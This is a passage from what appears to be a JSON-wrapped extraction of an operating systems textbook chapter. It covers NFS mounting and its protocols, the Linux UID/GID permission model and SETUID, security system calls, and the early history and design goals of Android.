own\r\nbin directory, so it can now refer to the shell as /bin/sh and get the shell on server\r\n1. Diskless workstations often have only a skeleton file system (in RAM) and get\r\nall their files from remote servers like this. Similarly, client 1 has mounted server\r\n2’s directory /projects on its directory /usr/ast/work so it can now access file a as\r\n/usr/ast/work/proj1/a. Finally, client 2 has also mounted the projects directory and\r\ncan also access file a, only as /mnt/proj1/a. As seen here, the same file can have\r\ndifferent names on different clients due to its being mounted in a different place in\r\nthe respective trees. The mount point is entirely local to the clients; the server does\r\nnot know where it is mounted on any of its clients.\n794 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nNFS Protocols\r\nSince one of the goals of NFS is to support a heterogeneous system, with cli\u0002ents and servers possibly running different operating systems on different hard\u0002ware, it is essential that the interface between the clients and servers be well de\u0002fined. Only then is anyone able to write a new client implementation and expect it\r\nto work correctly with existing servers, and vice versa.\r\nNFS accomplishes this goal by defining two client-server protocols. A proto\u0002col is a set of requests sent by clients to servers, along with the corresponding\r\nreplies sent by the servers back to the clients.\r\nThe first NFS protocol handles mounting. A client can send a path name to a\r\nserver and request permission to mount that directory somewhere in its directory\r\nhierarchy. The place where it is to be mounted is not contained in the message, as\r\nthe server does not care where it is to be mounted. If the path name is legal and the\r\ndirectory specified has been exported, the server returns a file handle to the client.\r\nThe file handle contains fields uniquely identifying the file-system type, the disk,\r\nthe i-node number of the directory, and security information. Subsequent calls to\r\nread and write files in the mounted directory or any of its subdirectories use the file\r\nhandle.\r\nWhen Linux boots, it runs the /etc/rc shell script before going multiuser. Com\u0002mands to mount remote file systems can be placed in this script, thus automatically\r\nmounting the necessary remote file systems before allowing any logins. Alterna\u0002tively, most versions of Linux also support automounting. This feature allows a\r\nset of remote directories to be associated with a local directory. None of these re\u0002mote directories are mounted (or their servers even contacted) when the client is\r\nbooted. Instead, the first time a remote file is opened, the operating system sends a\r\nmessage to each of the servers. The first one to reply wins, and its directory is\r\nmounted.\r\nAutomounting has two principal advantages over static mounting via the\r\n/etc/rc file. First, if one of the NFS servers named in /etc/rc happens to be down, it\r\nis impossible to bring the client up, at least not without some difficulty, delay, and\r\nquite a few error messages. If the user does not even need that server at the\r\nmoment, all that work is wasted. Second, by allowing the client to try a set of ser\u0002vers in parallel, a degree of fault tolerance can be achieved (because only one of\r\nthem needs to be up), and the performance can be improved (by choosing the first\r\none to reply—presumably the least heavily loaded).\r\nOn the other hand, it is tacitly assumed that all the file systems specified as al\u0002ternatives for the automount are identical. Since NFS provides no support for file\r\nor directory replication, it is up to the user to arrange for all the file systems to be\r\nthe same. Consequently, automounting is most often used for read-only file sys\u0002tems containing system binaries and other files that rarely change.\r\nThe second NFS protocol is for directory and file access. Clients can send\r\nmessages to servers to manipulate directories and read and write files. They can\nSEC. 10.6 THE LINUX FILE SYSTEM 795\r\nalso access file attributes, such as file mode, size, and time of last modification.\r\nMost Linux system calls are supported by NFS, with the perhaps surprising ex\u0002ceptions of open and close.\r\nThe omission of open and close is not an accident. It is fully intentional. It is\r\nnot necessary to open a file before reading it, nor to close it when done. Instead, to\r\nread a file, a client sends the server a lookup message containing the file name,\r\nwith a request to look it up and return a file handle, which is a structure that identi\u0002fies the file (i.e., contains a file system identifier and i-node number, among other\r\ndata). Unlike an open call, this lookup operation does not copy any information\r\ninto internal system tables. The read call contains the file handle of the file to read,\r\nthe offset in the file to begin reading, and the number of bytes desired. Each such\r\nmessage is self-contained. The advantage of this scheme is that the server does not\r\nhave to remember anything about open connections in between calls to it. Thus if a\r\nserver crashes and then recovers, no information about open files is lost, because\r\nthere is none. A server like this that does not maintain state information about\r\nopen files is said to be stateless.\r\nUnfortunately, the NFS method makes it difficult to achieve the exact Linux\r\nfile semantics. For example, in Linux a file can be opened and locked so that other\r\nprocesses cannot access it. When the file is closed, the locks are released. In a\r\nstateless server such as NFS, locks cannot be associated with open files, because\r\nthe server does not know which files are open. NFS therefore needs a separate, ad\u0002ditional mechanism to handle locking.\r\nNFS uses the standard UNIX protection mechanism, with the rwx bits for the\r\nowner, group, and others (mentioned in Chap. 1 and discussed in detail below).\r\nOriginally, each request message simply contained the user and group IDs of the\r\ncaller, which the NFS server used to validate the access. In effect, it trusted the cli\u0002ents not to cheat. Several years’ experience abundantly demonstrated that such an\r\nassumption was—how shall we put it?—rather naive. Currently, public key crypto\u0002graphy can be used to establish a secure key for validating the client and server on\r\neach request and reply. When this option is used, a malicious client cannot imper\u0002sonate another client because it does not know that client’s secret key.\r\nNFS Implementation\r\nAlthough the implementation of the client and server code is independent of\r\nthe NFS protocols, most Linux systems use a three-layer implementation similar to\r\nthat of Fig. 10-36. The top layer is the system-call layer. This handles calls like\r\nopen, read, and close. After parsing the call and checking the parameters, it\r\ninvokes the second layer, the Virtual File System (VFS) layer.\r\nThe task of the VFS layer is to maintain a table with one entry for each open\r\nfile. The VFS layer additionally has an entry, a virtual i-node, or v-node, for every\r\nopen file. V-nodes are used to tell whether the file is local or remote. For remote\r\nfiles, enough information is provided to be able to access them. For local files, the\n796 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nClient kernel Server kernel\r\nSystem call layer\r\nBuffer cache Buffer cache\r\nVirtual file system layer Virtual file system layer \r\nLocal\r\nFS 1\r\nLocal\r\nFS 1\r\nLocal\r\nFS 2\r\nLocal\r\nFS 2\r\nNFS\r\nclient\r\nNFS\r\nserver\r\nDriver Driver Driver Driver\r\nMessage\r\nto server\r\nMessage\r\nfrom client\r\nLocal disks Local disks\r\nV- node\r\nFigure 10-36. The NFS layer structure\r\nfile system and i-node are recorded because modern Linux systems can support\r\nmultiple file systems (e.g., ext2fs, /proc, FAT , etc.). Although VFS was invented to\r\nsupport NFS, most modern Linux systems now support it as an integral part of the\r\noperating system, even if NFS is not used.\r\nTo see how v-nodes are used, let us trace a sequence of mount, open, and read\r\nsystem calls. To mount a remote file system, the system administrator (or /etc/rc)\r\ncalls the mount program specifying the remote directory, the local directory on\r\nwhich it is to be mounted, and other information. The mount program parses the\r\nname of the remote directory to be mounted and discovers the name of the NFS\r\nserver on which the remote directory is located. It then contacts that machine, ask\u0002ing for a file handle for the remote directory. If the directory exists and is available\r\nfor remote mounting, the server returns a file handle for the directory. Finally, it\r\nmakes a mount system call, passing the handle to the kernel.\r\nThe kernel then constructs a v-node for the remote directory and asks the NFS\r\nclient code in Fig. 10-36 to create an r-node (remote i-node) in its internal tables\r\nto hold the file handle. The v-node points to the r-node. Each v-node in the VFS\r\nlayer will ultimately contain either a pointer to an r-node in the NFS client code, or\r\na pointer to an i-node in one of the local file systems (shown as dashed lines in\r\nFig. 10-36). Thus, from the v-node it is possible to see if a file or directory is local\r\nor remote. If it is local, the correct file system and i-node can be located. If it is\r\nremote, the remote host and file handle can be located.\nSEC. 10.6 THE LINUX FILE SYSTEM 797\r\nWhen a remote file is opened on the client, at some point during the parsing of\r\nthe path name, the kernel hits the directory on which the remote file system is\r\nmounted. It sees that this directory is remote and in the directory’s v-node finds\r\nthe pointer to the r-node. It then asks the NFS client code to open the file. The\r\nNFS client code looks up the remaining portion of the path name on the remote\r\nserver associated with the mounted directory and gets back a file handle for it. It\r\nmakes an r-node for the remote file in its tables and reports back to the VFS layer,\r\nwhich puts in its tables a v-node for the file that points to the r-node. Again here\r\nwe see that every open file or directory has a v-node that points to either an r-node\r\nor an i-node.\r\nThe caller is given a file descriptor for the remote file. This file descriptor is\r\nmapped onto the v-node by tables in the VFS layer. Note that no table entries are\r\nmade on the server side. Although the server is prepared to provide file handles\r\nupon request, it does not keep track of which files happen to have file handles out\u0002standing and which do not. When a file handle is sent to it for file access, it checks\r\nthe handle, and if it is valid, uses it. Validation can include verifying an authentica\u0002tion key contained in the RPC headers, if security is enabled.\r\nWhen the file descriptor is used in a subsequent system call, for example, read,\r\nthe VFS layer locates the corresponding v-node, and from that determines whether\r\nit is local or remote and also which i-node or r-node describes it. It then sends a\r\nmessage to the server containing the handle, the file offset (which is maintained on\r\nthe client side, not the server side), and the byte count. For efficiency reasons,\r\ntransfers between client and server are done in large chunks, normally 8192 bytes,\r\nev en if fewer bytes are requested.\r\nWhen the request message arrives at the server, it is passed to the VFS layer\r\nthere, which determines which local file system holds the requested file. The VFS\r\nlayer then makes a call to that local file system to read and return the bytes. These\r\ndata are then passed back to the client. After the client’s VFS layer has gotten the\r\n8-KB chunk it asked for, it automatically issues a request for the next chunk, so it\r\nwill have it should it be needed shortly. This feature, known as read ahead, im\u0002proves performance considerably.\r\nFor writes an analogous path is followed from client to server. Also, transfers\r\nare done in 8-KB chunks here, too. If a wr ite system call supplies fewer than 8 KB\r\nof data, the data are just accumulated locally. Only when the entire 8-KB chunk is\r\nfull is it sent to the server. Howev er, when a file is closed, all of its data are sent to\r\nthe server immediately.\r\nAnother technique used to improve performance is caching, as in ordinary\r\nUNIX. Servers cache data to avoid disk accesses, but this is invisible to the clients.\r\nClients maintain two caches, one for file attributes (i-nodes) and one for file data.\r\nWhen either an i-node or a file block is needed, a check is made to see if it can be\r\nsatisfied out of the cache. If so, network traffic can be avoided.\r\nWhile client caching helps performance enormously, it also introduces some\r\nnasty problems. Suppose that two clients are both caching the same file block and\n798 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\none of them modifies it. When the other one reads the block, it gets the old (stale)\r\nvalue. The cache is not coherent.\r\nGiven the potential severity of this problem, the NFS implementation does sev\u0002eral things to mitigate it. For one, associated with each cache block is a timer.\r\nWhen the timer expires, the entry is discarded. Normally, the timer is 3 sec for data\r\nblocks and 30 sec for directory blocks. Doing this reduces the risk somewhat. In\r\naddition, whenever a cached file is opened, a message is sent to the server to find\r\nout when the file was last modified. If the last modification occurred after the local\r\ncopy was cached, the cache copy is discarded and the new copy fetched from the\r\nserver. Finally, once every 30 sec a cache timer expires, and all the dirty (i.e., mod\u0002ified) blocks in the cache are sent to the server. While not perfect, these patches\r\nmake the system highly usable in most practical circumstances.\r\nNFS Version 4\r\nVersion 4 of the Network File System was designed to simplify certain opera\u0002tions from its predecessor. In contrast to NSFv3, which is described above, NFSv4\r\nis a stateful file system. This permits open operations to be invoked on remote\r\nfiles, since the remote NFS server will maintain all file-system-related structures,\r\nincluding the file pointer. Read operations then need not include absolute read\r\nranges, but can be incrementally applied from the previous file-pointer position.\r\nThis results in shorter messages, and also in the ability to bundle multiple NFSv3\r\noperations in one network transaction.\r\nThe stateful nature of NFSv4 makes it easy to integrate the variety of NFSv3\r\nprotocols described earlier in this section into one coherent protocol. There is no\r\nneed to support separate protocols for mounting, caching, locking, or secure opera\u0002tions. NFSv4 also works better with both Linux (and UNIX in general) and Win\u0002dows file-system semantics."
          }
        }
      },
      "10.7 SECURITY IN LINUX": {
        "page": 829,
        "children": {
          "10.7.1 Fundamental Concepts": {
            "page": 829,
            "content": "10.7.1 Fundamental Concepts\r\nThe user community for a Linux system consists of some number of registered\r\nusers, each of whom has a unique UID (User ID). A UID is an integer between 0\r\nand 65,535. Files (but also processes and other resources) are marked with the\nSEC. 10.7 SECURITY IN LINUX 799\r\nUID of their owner. By default, the owner of a file is the person who created the\r\nfile, although there is a way to change ownership.\r\nUsers can be organized into groups, which are also numbered with 16-bit inte\u0002gers called GIDs (Group IDs). Assigning users to groups is done manually (by\r\nthe system administrator) and consists of making entries in a system database tel\u0002ling which user is in which group. A user could be in one or more groups at the\r\nsame time. For simplicity, we will not discuss this feature further.\r\nThe basic security mechanism in Linux is simple. Each process carries the UID\r\nand GID of its owner. When a file is created, it gets the UID and GID of the creat\u0002ing process. The file also gets a set of permissions determined by the creating proc\u0002ess. These permissions specify what access the owner, the other members of the\r\nowner’s group, and the rest of the users have to the file. For each of these three cat\u0002egories, potential accesses are read, write, and execute, designated by the letters r,\r\nw, and x, respectively. The ability to execute a file makes sense only if that file is\r\nan executable binary program, of course. An attempt to execute a file that has ex\u0002ecute permission but which is not executable (i.e., does not start with a valid head\u0002er) will fail with an error. Since there are three categories of users and 3 bits per\r\ncategory, 9 bits are sufficient to represent the access rights. Some examples of\r\nthese 9-bit numbers and their meanings are given in Fig. 10-37.\r\nBinar y Symbolic Allowed file accesses\r\n111000000 rwx–––––– Owner can read, write, and execute\r\n111111000 rwxrwx––– Owner and group can read, write, and execute\r\n110100000 rw–r––––– Owner can read and write; group can read\r\n110100100 rw–r– –r– – Owner can read and write; all others can read\r\n111101101 rwxr–xr–x Owner can do everything, rest can read and execute\r\n000000000 ––––––––– Nobody has any access\r\n000000111 ––––– –rwx Only outsiders have access (strange, but legal)\r\nFigure 10-37. Some example file-protection modes.\r\nThe first two entries in Fig. 10-37 allow the owner and the owner’s group full\r\naccess, respectively. The next one allows the owner’s group to read the file but not\r\nto change it, and prevents outsiders from any access. The fourth entry is common\r\nfor a data file the owner wants to make public. Similarly, the fifth entry is the\r\nusual one for a publicly available program. The sixth entry denies all access to all\r\nusers. This mode is sometimes used for dummy files used for mutual exclusion be\u0002cause an attempt to create such a file will fail if one already exists. Thus if multiple\r\nprocesses simultaneously attempt to create such a file as a lock, only one of them\r\nwill succeed. The last example is strange indeed, since it gives the rest of the world\r\nmore access than the owner. Howev er, its existence follows from the protection\r\nrules. Fortunately, there is a way for the owner to subsequently change the protec\u0002tion mode, even without having any access to the file itself.\n800 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nThe user with UID 0 is special and is called the superuser (or root). The\r\nsuperuser has the power to read and write all files in the system, no matter who\r\nowns them and no matter how they are protected. Processes with UID 0 also have\r\nthe ability to make a small number of protected system calls denied to ordinary\r\nusers. Normally, only the system administrator knows the superuser’s password, al\u0002though many undergraduates consider it a great sport to try to look for security\r\nflaws in the system so they can log in as the superuser without knowing the pass\u0002word. Management tends to frown on such activity.\r\nDirectories are files and have the same protection modes that ordinary files do\r\nexcept that the x bits refer to search permission instead of execute permission.\r\nThus a directory with mode rwxr–xr–x allows its owner to read, modify, and search\r\nthe directory, but allows others only to read and search it, but not add or remove\r\nfiles from it.\r\nSpecial files corresponding to the I/O devices have the same protection bits as\r\nregular files. This mechanism can be used to limit access to I/O devices. For ex\u0002ample, the printer special file, /dev/lp, could be owned by the root or by a special\r\nuser, daemon, and have mode rw– – – – – – – to keep everyone else from directly\r\naccessing the printer. After all, if everyone could just print at will, chaos would re\u0002sult.\r\nOf course, having /dev/lp owned by, say, daemon with protection mode\r\nrw– – – – – – – means that nobody else can use the printer. While this would save\r\nmany innocent trees from an early death, sometimes users do have a legitimate\r\nneed to print something. In fact, there is a more general problem of allowing con\u0002trolled access to all I/O devices and other system resources.\r\nThis problem was solved by adding a new protection bit, the SETUID bit, to\r\nthe 9 protection bits discussed above. When a program with the SETUID bit on is\r\nexecuted, the effective UID for that process becomes the UID of the executable\r\nfile’s owner instead of the UID of the user who invoked it. When a process at\u0002tempts to open a file, it is the effective UID that is checked, not the underlying real\r\nUID. By making the program that accesses the printer be owned by daemon but\r\nwith the SETUID bit on, any user could execute it, and have the power of daemon\r\n(e.g., access to /dev/lp) but only to run that program (which might queue print jobs\r\nfor printing in an orderly fashion).\r\nMany sensitive Linux programs are owned by the root but with the SETUID\r\nbit on. For example, the program that allows users to change their passwords,\r\npasswd, needs to write in the password file. Making the password file publicly\r\nwritable would not be a good idea. Instead, there is a program that is owned by the\r\nroot and which has the SETUID bit on. Although the program has complete access\r\nto the password file, it will change only the caller’s password and not permit any\r\nother access to the password file.\r\nIn addition to the SETUID bit there is also a SETGID bit that works analo\u0002gously, temporarily giving the user the effective GID of the program. In practice,\r\nthis bit is rarely used, however.\nSEC. 10.7 SECURITY IN LINUX 801"
          },
          "10.7.2 Security System Calls in Linux": {
            "page": 832,
            "content": "10.7.2 Security System Calls in Linux\r\nThere are only a small number of system calls relating to security. The most\r\nimportant ones are listed in Fig. 10-38. The most heavily used security system call\r\nis chmod. It is used to change the protection mode. For example,\r\ns = chmod(\"/usr/ast/newgame\", 0755);\r\nsets newgame to rwxr–xr–x so that everyone can run it (note that 0755 is an octal\r\nconstant, which is convenient, since the protection bits come in groups of 3 bits).\r\nOnly the owner of a file and the superuser can change its protection bits.\r\nSystem call Description\r\ns = chmod(path, mode) Change a file’s protection mode\r\ns = access(path, mode) Check access using the real UID and GID\r\nuid = getuid( ) Get the real UID\r\nuid = geteuid( ) Get the effective UID\r\ngid = getgid( ) Get the real GID\r\ngid = getegid( ) Get the effective GID\r\ns = chown(path, owner, group) Change owner and group\r\ns = setuid(uid) Set the UID\r\ns = setgid(gid) Set the GID\r\nFigure 10-38. Some system calls relating to security. The return code s is −1 if\r\nan error has occurred; uid and gid are the UID and GID, respectively. The param\u0002eters should be self explanatory.\r\nThe access call tests to see if a particular access would be allowed using the\r\nreal UID and GID. This system call is needed to avoid security breaches in pro\u0002grams that are SETUID and owned by the root. Such a program can do anything,\r\nand it is sometimes needed for the program to figure out if the user is allowed to\r\nperform a certain access. The program cannot just try it, because the access will al\u0002ways succeed. With the access call the program can find out if the access is allow\u0002ed by the real UID and real GID.\r\nThe next four system calls return the real and effective UIDs and GIDs. The\r\nlast three are allowed only for the superuser. They change a file’s owner, and a\r\nprocess’ UID and GID."
          },
          "10.7.3 Implementation of Security in Linux": {
            "page": 832,
            "content": "10.7.3 Implementation of Security in Linux\r\nWhen a user logs in, the login program, login (which is SETUID root) asks for\r\na login name and a password. It hashes the password and then looks in the pass\u0002word file, /etc/passwd, to see if the hash matches the one there (networked systems\r\nwork slightly differently). The reason for using hashes is to prevent the password\n802 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nfrom being stored in unencrypted form anywhere in the system. If the password is\r\ncorrect, the login program looks in /etc/passwd to see the name of the user’s pre\u0002ferred shell, possibly bash, but possibly some other shell such as csh or ksh. The\r\nlogin program then uses setuid and setgid to give itself the user’s UID and GID\r\n(remember, it started out as SETUID root). Then it opens the keyboard for stan\u0002dard input (file descriptor 0), the screen for standard output (file descriptor 1), and\r\nthe screen for standard error (file descriptor 2). Finally, it executes the preferred\r\nshell, thus terminating itself.\r\nAt this point the preferred shell is running with the correct UID and GID and\r\nstandard input, output, and error all set to their default devices. All processes that it\r\nforks off (i.e., commands typed by the user) automatically inherit the shell’s UID\r\nand GID, so they also will have the correct owner and group. All files they create\r\nalso get these values.\r\nWhen any process attempts to open a file, the system first checks the protec\u0002tion bits in the file’s i-node against the caller’s effective UID and effective GID to\r\nsee if the access is permitted. If so, the file is opened and a file descriptor returned.\r\nIf not, the file is not opened and −1 is returned. No checks are made on subsequent\r\nread or wr ite calls. As a consequence, if the protection mode changes after a file is\r\nalready open, the new mode will not affect processes that already have the file\r\nopen.\r\nThe Linux security model and its implementation are essentially the same as in\r\nmost other traditional UNIX systems."
          }
        }
      },
      "10.8 ANDROID": {
        "page": 833,
        "children": {
          "10.8.1 Android and Google": {
            "page": 834,
            "content": "10.8.1 Android and Google\r\nAndroid is an unusual operating system in the way it combines open-source\r\ncode with closed-source third-party applications. The open-source part of Android\r\nis called the Android Open Source Project (AOSP) and is completely open and\r\nfree to be used and modified by anyone.\r\nAn important goal of Android is to support a rich third-party application envi\u0002ronment, which requires having a stable implementation and API for applications\r\nto run against. However, in an open-source world where every device manufac\u0002turer can customize the platform however it wants, compatibility issues quickly\r\narise. There needs to be some way to control this conflict.\r\nPart of the solution to this for Android is the CDD (Compatibility Definition\r\nDocument), which describes the ways Android must behave to be compatible with\r\nthird party applications. This document by itself describes what is required to be a\r\ncompatible Android device. Without some way to enforce such compatibility, how\u0002ev er, it will often be ignored; there needs to be some additional mechanism to do\r\nthis.\r\nAndroid solves this by allowing additional proprietary services to be created\r\non top of the open-source platform, providing (typically cloud-based) services that\r\nthe platform cannot itself implement. Since these services are proprietary, they can\r\nrestrict which devices are allowed to include them, thus requiring CDD compatibil\u0002ity of those devices.\r\nGoogle implemented Android to be able to support a wide variety of propri\u0002etary cloud services, with Google’s extensive set of services being representative\r\ncases: Gmail, calendar and contacts sync, cloud-to-device messaging, and many\r\nother services, some visible to the user, some not. When it comes to offering com\u0002patible apps, the most important service is Google Play.\r\nGoogle Play is Google’s online store for Android apps. Generally when devel\u0002opers create Android applications, they will publish with Google Play. Since\r\nGoogle Play (or any other application store) is the channel through which applica\u0002tions are delivered to an Android device, that proprietary service is responsible for\r\nensuring that applications will work on the devices it delivers them to.\r\nGoogle Play uses two main mechanisms to ensure compatibility. The first and\r\nmost important is requiring that any device shipping with it must be a compatible\r\nAndroid device as per the CDD. This ensures a baseline of behavior across all de\u0002vices. In addition, Google Play must know about any features of a device that an\r\napplication requires (such as there being a GPS for performing mapping naviga\u0002tion) so the application is not made available on devices that lack those features.\n804 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10"
          },
          "10.8.2 History of Android": {
            "page": 835,
            "content": "10.8.2 History of Android\r\nGoogle developed Android in the mid-2000s, after acquiring Android as a\r\nstartup company early in its development. Nearly all the development of the\r\nAndroid platform that exists today was done under Google’s management.\r\nEarly Development\r\nAndroid, Inc. was a software company founded to build software to create\r\nsmarter mobile devices. Originally looking at cameras, the vision soon switched to\r\nsmartphones due to their larger potential market. That initial goal grew to ad\u0002dressing the then-current difficulty in developing for mobile devices, by bringing\r\nto them an open platform built on top of Linux that could be widely used.\r\nDuring this time, prototypes for the platform’s user interface were imple\u0002mented to demonstrate the ideas behind it. The platform itself was targeting three\r\nkey languages, JavaScript, Java, and C++, in order to support a rich application-de\u0002velopment environment.\r\nGoogle acquired Android in July 2005, providing the necessary resources and\r\ncloud-service support to continue Android development as a complete product. A\r\nfairly small group of engineers worked closely together during this time, starting to\r\ndevelop the core infrastructure for the platform and foundations for higher-level\r\napplication development.\r\nIn early 2006, a significant shift in plan was made: instead of supporting multi\u0002ple programming languages, the platform would focus entirely on the Java pro\u0002gramming language for its application development. This was a difficult change,\r\nas the original multilanguage approach superficially kept everyone happy with ‘‘the\r\nbest of all worlds’’; focusing on one language felt like a step backward to engineers\r\nwho preferred other languages.\r\nTrying to make everyone happy, howev er, can easily make nobody happy.\r\nBuilding out three different sets of language APIs would have required much more\r\neffort than focusing on a single language, greatly reducing the quality of each one.\r\nThe decision to focus on the Java language was critical for the ultimate quality of\r\nthe platform and the development team’s ability to meet important deadlines.\r\nAs development progressed, the Android platform was developed closely with\r\nthe applications that would ultimately ship on top of it. Google already had a wide\r\nvariety of services—including Gmail, Maps, Calendar, YouTube, and of course\r\nSearch—that would be delivered on top of Android. Knowledge gained from im\u0002plementing these applications on top of the early platform was fed back into its de\u0002sign. This iterative process with the applications allowed many design flaws in the\r\nplatform to be addressed early in its development.\r\nMost of the early application development was done with little of the underly\u0002ing platform actually available to the developers. The platform was usually run\u0002ning all inside one process, through a ‘‘simulator’’ that ran all of the system and\nSEC. 10.8 ANDROID 805\r\napplications as a single process on a host computer. In fact there are still some\r\nremnants of this old implementation around today, with things like the Applica\u0002tion.onTer minate method still in the SDK (Software Dev elopment Kit), which\r\nAndroid programmers use to write applications.\r\nIn June 2006, two hardware devices were selected as software-development\r\ntargets for planned products. The first, code-named ‘‘Sooner,’’ was based on an\r\nexisting smartphone with a QWERTY keyboard and screen without touch input.\r\nThe goal of this device was to get an initial product out as soon as possible, by\r\nleveraging existing hardware. The second target device, code-named ‘‘Dream,’’\r\nwas designed specifically for Android, to run it as fully envisioned. It included a\r\nlarge (for that time) touch screen, slide-out QWERTY keyboard, 3G radio (for fast\u0002er web browsing), accelerometer, GPS and compass (to support Google Maps), etc.\r\nAs the software schedule came better into focus, it became clear that the two\r\nhardware schedules did not make sense. By the time it was possible to release\r\nSooner, that hardware would be well out of date, and the effort put on Sooner was\r\npushing out the more important Dream device. To address this, it was decided to\r\ndrop Sooner as a target device (though development on that hardware continued for\r\nsome time until the newer hardware was ready) and focus entirely on Dream.\r\nAndroid 1.0\r\nThe first public availability of the Android platform was a preview SDK re\u0002leased in November 2007. This consisted of a hardware device emulator running a\r\nfull Android device system image and core applications, API documentation, and a\r\ndevelopment environment. At this point the core design and implementation were\r\nin place, and in most ways closely resembled the modern Android system architec\u0002ture we will be discussing. The announcement included video demos of the plat\u0002form running on top of both the Sooner and Dream hardware.\r\nEarly development of Android had been done under a series of quarterly demo\r\nmilestones to drive and show continued process. The SDK release was the first\r\nmore formal release for the platform. It required taking all the pieces that had been\r\nput together so far for application development, cleaning them up, documenting\r\nthem, and creating a cohesive dev elopment environment for third-party developers.\r\nDevelopment now proceeded along two tracks: taking in feedback about the\r\nSDK to further refine and finalize APIs, and finishing and stabilizing the imple\u0002mentation needed to ship the Dream device. A number of public updates to the\r\nSDK occurred during this time, culminating in a 0.9 release in August 2008 that\r\ncontained the nearly final APIs.\r\nThe platform itself had been going through rapid development, and in the\r\nspring of 2008 the focus was shifting to stabilization so that Dream could ship.\r\nAndroid at this point contained a large amount of code that had never been shipped\r\nas a commercial product, all the way from parts of the C library, through the\r\nDalvik interpreter (which runs the apps), system, and applications.\n806 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nAndroid also contained quite a few novel design ideas that had never been\r\ndone before, and it was not clear how they would pan out. This all needed to come\r\ntogether as a stable product, and the team spent a few nail-biting months wonder\u0002ing if all of this stuff would actually come together and work as intended.\r\nFinally, in August 2008, the software was stable and ready to ship. Builds\r\nwent to the factory and started being flashed onto devices. In September Android\r\n1.0 was launched on the Dream device, now called the T-Mobile G1.\r\nContinued Development\r\nAfter Android’s 1.0 release, development continued at a rapid pace. There\r\nwere about 15 major updates to the platform over the following 5 years, adding a\r\nlarge variety of new features and improvements from the initial 1.0 release.\r\nThe original Compatibility Definition Document basically allowed only for\r\ncompatible devices that were very much like the T-Mobile G1. Over the following\r\nyears, the range of compatible devices would greatly expand. Key points of this\r\nprocess were:\r\n1. During 2009, Android versions 1.5 through 2.0 introduced a soft\r\nkeyboard to remove a requirement for a physical keyboard, much\r\nmore extensive screen support (both size and pixel density) for lower\u0002end QVGA devices and new larger and higher density devices like the\r\nWVGA Motorola Droid, and a new ‘‘system feature’’ facility for de\u0002vices to report what hardware features they support and applications\r\nto indicate which hardware features they require. The latter is the key\r\nmechanism Google Play uses to determine application compatibility\r\nwith a specific device.\r\n2. During 2011, Android versions 3.0 through 4.0 introduced new core\r\nsupport in the platform for 10-inch and larger tablets; the core plat\u0002form now fully supported device screen sizes everywhere from small\r\nQVGA phones, through smartphones and larger ‘‘phablets,’’ 7-inch\r\ntablets and larger tablets to beyond 10 inches.\r\n3. As the platform provided built-in support for more diverse hardware,\r\nnot only larger screens but also nontouch devices with or without a\r\nmouse, many more types of Android devices appeared. This included\r\nTV devices such as Google TV, gaming devices, notebooks, cameras,\r\netc.\r\nSignificant development work also went into something not as visible: a\r\ncleaner separation of Google’s proprietary services from the Android open-source\r\nplatform.\r\nFor Android 1.0, significant work had been put into having a clean third-party\r\napplication API and an open-source platform with no dependencies on proprietary\nSEC. 10.8 ANDROID 807\r\nGoogle code. However, the implementation of Google’s proprietary code was\r\noften not yet cleaned up, having dependencies on internal parts of the platform.\r\nOften the platform did not even hav e facilities that Google’s proprietary code need\u0002ed in order to integrate well with it. A series of projects were soon undertaken to\r\naddress these issues:\r\n1. In 2009, Android version 2.0 introduced an architecture for third par\u0002ties to plug their own sync adapters into platform APIs like the con\u0002tacts database. Google’s code for syncing various data moved to this\r\nwell-defined SDK API.\r\n2. In 2010, Android version 2.2 included work on the internal design\r\nand implementation of Google’s proprietary code. This ‘‘great\r\nunbundling’’ cleanly implemented many core Google services, from\r\ndelivering cloud-based system software updates to ‘‘cloud-to-device\r\nmessaging’’ and other background services, so that they could be de\u0002livered and updated separately from the platform.\r\n3. In 2012, a new Google Play services application was delivered to de\u0002vices, containing updated and new features for Google’s proprietary\r\nnonapplication services. This was the outgrowth of the unbundling\r\nwork in 2010, allowing proprietary APIs such as cloud-to-device mes\u0002saging and maps to be fully delivered and updated by Google."
          },
          "10.8.3 Design Goals": {
            "page": 838,
            "content": "10.8.3 Design Goals\r\nA number of key design goals for the Android platform evolved during its de\u0002velopment:\r\n1. Provide a complete open-source platform for mobile devices. The\r\nopen-source part of Android is a bottom-to-top operating system\r\nstack, including a variety of applications, that can ship as a complete\r\nproduct.\r\n2. Strongly support proprietary third-party applications with a robust\r\nand stable API. As previously discussed, it is challenging to maintain\r\na platform that is both truly open-source and also stable enough for\r\nproprietary third-party applications. Android uses a mix of technical\r\nsolutions (specifying a very well-defined SDK and division between\r\npublic APIs and internal implementation) and policy requirements\r\n(through the CDD) to address this.\r\n3. Allow all third-party applications, including those from Google, to\r\ncompete on a level playing field. The Android open source code is\n808 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\ndesigned to be neutral as much as possible to the higher-level system\r\nfeatures built on top of it, from access to cloud services (such as data\r\nsync or cloud-to-device messaging APIs), to libraries (such as\r\nGoogle’s mapping library) and rich services like application stores.\r\n4. Provide an application security model in which users do not have to\r\ndeeply trust third-party applications. The operating system must pro\u0002tect the user from misbehavior of applications, not only buggy appli\u0002cations that can cause it to crash, but more subtle misuse of the device\r\nand the user’s data on it. The less users need to trust applications, the\r\nmore freedom they hav e to try out and install them.\r\n5. Support typical mobile user interaction: spending short amounts of\r\ntime in many apps. The mobile experience tends to involve brief\r\ninteractions with applications: glancing at new received email, receiv\u0002ing and sending an SMS message or IM, going to contacts to place a\r\ncall, etc. The system needs to optimize for these cases with fast app\r\nlaunch and switch times; the goal for Android has generally been 200\r\nmsec to cold start a basic application up to the point of showing a full\r\ninteractive UI.\r\n6. Manage application processes for users, simplifying the user experi\u0002ence around applications so that users do not have to worry about\r\nclosing applications when done with them. Mobile devices also tend\r\nto run without the swap space that allows operating systems to fail\r\nmore gracefully when the current set of running applications requires\r\nmore RAM than is physically available. To address both of these re\u0002quirements, the system needs to take a more proactive stance about\r\nmanaging processes and deciding when they should be started and\r\nstopped.\r\n7. Encourage applications to interoperate and 